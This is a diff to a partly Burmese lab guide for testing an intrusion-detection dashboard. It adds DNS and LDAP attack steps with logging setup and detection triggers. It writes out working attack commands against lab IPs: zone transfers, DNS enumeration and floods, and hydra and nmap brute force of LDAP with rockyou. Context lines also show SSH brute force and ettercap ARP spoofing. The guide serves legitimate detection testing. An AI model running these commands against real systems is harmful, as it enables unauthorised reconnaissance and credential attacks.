@@ -179,7 +179,158 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://UBUNTU_IP:2222
 
 ---
 
-## STEP 6 — FTP Attack
+## STEP 6 — DNS Attack (company-dns-server)
+
+### ⚠️ VM Pre-requisite: BIND9 Query Logging ဖွင့်ရမည်
+
+BIND9 default အနေဖြင့် query log မထုတ်ဘူး — ဒီ config မပေးဘဲ forwarder က ဘာမှ detect မလုပ်နိုင်ဘူး။
+
+**company-dns-server မှာ run ရမည်:**
+```bash
+# 1. Log directory create
+sudo mkdir -p /var/log/named
+sudo chown bind:bind /var/log/named
+sudo chmod 755 /var/log/named
+
+# 2. named.conf.local မှာ logging section ထည့်
+sudo tee -a /etc/bind/named.conf.local <<'EOF'
+
+logging {
+    channel queries_log {
+        file "/var/log/named/named.log" versions 3 size 10m;
+        severity dynamic;
+        print-time yes;
+        print-severity yes;
+        print-category yes;
+    };
+    category queries { queries_log; };
+    category default { queries_log; };
+};
+EOF
+
+# 3. BIND9 restart
+sudo systemctl restart bind9
+
+# 4. စစ်ဆေး — log file ဖြစ်နေမှာ
+sudo tail -f /var/log/named/named.log
+```
+
+> AppArmor profile issue ဖြစ်ရင်:
+> `sudo nano /etc/apparmor.d/usr.sbin.named` → `/var/log/named/** rw,` ထည့် → `sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.named`
+
+---
+
+### Kali မှာ run
+
+```bash
+# DNS Zone Transfer (AXFR) — HIGH severity alert
+dig AXFR company.local @DNS_SERVER_IP
+dig AXFR @DNS_SERVER_IP company.local
+
+# DNS enumeration (dnsenum)
+dnsenum --dnsserver DNS_SERVER_IP company.local
+
+# DNS brute force (dnsrecon) — 30+ queries in 60s → flood detect
+dnsrecon -d company.local -n DNS_SERVER_IP -t brt
+
+# Fierce DNS recon
+fierce --domain company.local --dns-servers DNS_SERVER_IP
+
+# Manual refused query flood
+for i in $(seq 1 10); do dig @DNS_SERVER_IP nonexistent$i.company.local; done
+```
+
+> `DNS_SERVER_IP` = `10.10.10.20` (company-dns-server)
+
+### Dashboard မှာ မြင်ရမည်
+
+- **Security Events** → `dns_attack / dns_zone_transfer` (HIGH) — AXFR
+- **Security Events** → `dns_attack / dns_query_refused` (MEDIUM) — enum/flood
+- **Connection Logs → DNS tab** → DNS attack records
+
+### Forwarder detect conditions
+
+| Attack | Trigger |
+|---|---|
+| Zone transfer | AXFR/IXFR keyword in log line |
+| DNS recon | ≥5 denied/refused queries from same IP in 60s |
+| DNS flood/enum | ≥30 total queries from same IP in 60s |
+
+---
+
+## STEP 7 — LDAP Attack (company-ldap-server)
+
+### ⚠️ VM Pre-requisite: slapd Logging ဖွင့်ရမည်
+
+OpenLDAP default loglevel=0 — connection/auth events log မထွက်ဘူး။
+
+**company-ldap-server မှာ run ရမည်:**
+```bash
+# Option A — cn=config (modern Ubuntu, recommended)
+sudo ldapmodify -Y EXTERNAL -H ldapi:/// <<'EOF'
+dn: cn=config
+changetype: modify
+replace: olcLogLevel
+olcLogLevel: 256
+EOF
+# loglevel 256 = connections; 1 = trace; 256+1 = connections+auth details
+
+# Option B — slapd.conf (older setups)
+# /etc/ldap/slapd.conf မှာ: loglevel 256
+
+# syslog ကို စစ်ဆေး — slapd connection entries ပေါ်ရမည်
+sudo tail -f /var/log/syslog | grep slapd
+
+# ပေါ်မလာရင် rsyslog config စစ်
+sudo systemctl restart rsyslog slapd
+```
+
+**ပေါ်မလာသေးရင် alternative log path:**
+```bash
+# journald မှ syslog ကို forward လုပ်ရမည်
+echo "ForwardToSyslog=yes" | sudo tee -a /etc/systemd/journald.conf
+sudo systemctl restart systemd-journald rsyslog
+```
+
+---
+
+### Kali မှာ run
+
+```bash
+# LDAP brute force (hydra) — err=49 trigger
+hydra -l "cn=admin,dc=company,dc=local" -P /usr/share/wordlists/rockyou.txt \
+  ldap2://LDAP_SERVER_IP
+
+# ldapsearch with wrong password (manual test)
+ldapsearch -H ldap://LDAP_SERVER_IP -x -D "cn=admin,dc=company,dc=local" \
+  -w wrongpassword -b "dc=company,dc=local"
+
+# DN enumeration — err=32 trigger (nonexistent DN)
+ldapsearch -H ldap://LDAP_SERVER_IP -x -D "cn=fake,dc=company,dc=local" \
+  -w anypassword -b "dc=company,dc=local"
+
+# nmap LDAP script
+nmap -sV -p 389 --script ldap-brute,ldap-search LDAP_SERVER_IP
+```
+
+> `LDAP_SERVER_IP` = `10.20.20.20` (company-ldap-server)
+
+### Dashboard မှာ မြင်ရမည်
+
+- **Security Events** → `ldap_attack / LDAP Auth Brute Force` (HIGH)
+- **Security Events** → `ldap_attack / LDAP Enum` (HIGH) — DN enumeration
+- **Connection Logs → LDAP tab** → LDAP attack records
+
+### Forwarder detect conditions
+
+| slapd error | Attack type | Severity |
+|---|---|---|
+| err=49 / "Invalid credentials" | Auth Brute | HIGH |
+| err=32 / "No such object" | Enum | HIGH |
+
+---
+
+## STEP 8 — FTP Attack
 
 ```bash
 # FTP brute force
@@ -194,7 +345,7 @@ ftp UBUNTU_IP
 
 ---
 
-## STEP 7 — ARP Spoofing / MITM
+## STEP 9 — ARP Spoofing / MITM
 
 ```bash
 # ARP spoofing (Kali မှာ)
@@ -206,7 +357,7 @@ sudo ettercap -T -M arp:remote /UBUNTU_IP// /GATEWAY_IP//
 
 ---
 
-## STEP 8 — Encrypted Traffic Anomaly (TLS)
+## STEP 10 — Encrypted Traffic Anomaly (TLS)
 
 ```bash
 # Weak cipher test (openssl)
